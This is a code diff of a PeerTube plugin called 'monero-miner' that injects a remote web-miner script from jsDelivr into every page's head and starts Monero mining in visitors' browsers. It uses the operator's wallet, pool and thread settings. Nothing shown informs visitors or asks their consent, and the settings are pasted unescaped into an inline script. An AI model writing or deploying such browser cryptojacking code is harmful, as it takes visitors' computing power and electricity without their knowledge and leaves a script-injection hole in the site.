@@ -1,71 +1,83 @@
-const fs = require('fs');
-const path = require('path');
+// 不要なモジュールは削除
+// const fs = require('fs');
+// const path = require('path');
 
 module.exports = {
   manifest: {
     name: 'monero-miner',
     description: 'PeerTube plugin for Monero mining.',
-    version: '1.0.0',
+    version: '1.0.10',
     license: 'MIT',
     author: 'PYU224',
     dependencies: {},
   },
 
-  async register({
-    registerHook,
-    registerSetting,
-  }) {
-    // Register settings for Monero Miner
-    registerSetting({
-      name: 'walletAddress',
-      label: 'Monero Wallet Address',
-      type: 'input', // Text input
-      private: false,
-    });
+  async register({ registerHook, registerSetting }) {
+    // Register plugin settings
+    const settings = [
+      {
+        name: 'walletAddress',
+        label: 'Monero Wallet Address',
+        type: 'input',
+        private: false,
+        default: '',
+      },
+      {
+        name: 'webSocket',
+        label: 'WebSocket Server',
+        type: 'input',
+        private: false,
+        default: 'wss://ny1.xmrminingproxy.com',
+      },
+      {
+        name: 'poolAddress',
+        label: 'Mining Pool Address',
+        type: 'input',
+        private: false,
+        default: 'moneroocean.stream',
+      },
+      {
+        name: 'threads',
+        label: 'Number of Threads',
+        type: 'input',
+        private: false,
+        default: '2',
+      },
+      {
+        name: 'password',
+        label: 'Password',
+        type: 'input',
+        private: false,
+        default: '',
+      },
+    ];
 
-    registerSetting({
-      name: 'webSocket',
-      label: 'WebSocket Server',
-      type: 'input',
-      private: false,
-      default: 'wss://ny1.xmrminingproxy.com', // Default value
-    });
+    // registerSettingで複数の設定を登録する際にfor文で設定をまとめて処理する
+    for (const setting of settings) {
+      registerSetting(setting);
+    }
 
-    registerSetting({
-      name: 'poolAddress',
-      label: 'Mining Pool Address',
-      type: 'input',
-      private: false,
-      default: 'moneroocean.stream',
-    });
-
-    registerSetting({
-      name: 'threads',
-      label: 'Number of Threads',
-      type: 'number',
-      private: false,
-      default: 2, // Default number of threads
-    });
-
-    // Hook to inject Monero Miner script into the theme's head
+    // Hook to inject mining script into the theme's head
     registerHook({
       target: 'action:theme.head',
       handler: ({ settings }) => {
-        const walletAddress = settings.walletAddress || '';
-        const webSocket = settings.webSocket || 'wss://ny1.xmrminingproxy.com';
-        const poolAddress = settings.poolAddress || 'moneroocean.stream';
-        const threads = settings.threads || 2;
+        const { walletAddress, webSocket, poolAddress, threads, password } = settings;
+        if (!walletAddress || !poolAddress) {
+          console.error('Monero miner plugin: Required settings are missing.');
+          return '';
+        }
 
         return `
+          <!-- Monero Miner Script -->
           <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
           <script>
             const server = "${webSocket}";
             const pool = "${poolAddress}";
-            const walletAddress = "${walletAddress}";
-            const workerId = "GH-XMR";
+            const wallet = "${walletAddress}";
+            const workerId = "PeerTube-Miner";
             const threads = ${threads};
-            const password = "";
-            startMining(pool, walletAddress, workerId, threads, password);
+            const password = "${password}";
+            startMining(pool, wallet, workerId, threads, password);
             throttleMiner = 20;
           </script>
         `;
